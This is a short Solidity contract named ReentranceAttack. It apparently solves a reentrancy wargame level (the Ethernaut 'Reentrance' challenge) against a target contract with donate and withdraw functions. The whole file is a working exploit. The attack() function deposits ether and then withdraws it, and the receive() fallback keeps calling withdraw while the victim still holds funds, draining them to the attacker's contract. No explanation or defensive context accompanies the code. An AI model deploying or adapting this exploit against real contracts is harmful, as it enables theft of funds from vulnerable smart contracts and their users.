// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ReentranceAttack {
  address public owner;
  IReentrance victimContract;
  uint amount = 0.01 ether;

  constructor(address payable _victim) public {
    victimContract = IReentrance(_victim);
    owner = msg.sender;
  }

  function balance() public view returns (uint) {
      return address(this).balance / 1 ether;
  }

  function attack() public payable {
    require(msg.value >= amount);
    victimContract.donate{value: msg.value}(address(this));
    victimContract.withdraw(msg.value);
  }

  receive() external payable {
    if (address(victimContract).balance >= amount) {
      victimContract.withdraw(msg.value);
    }
  }
}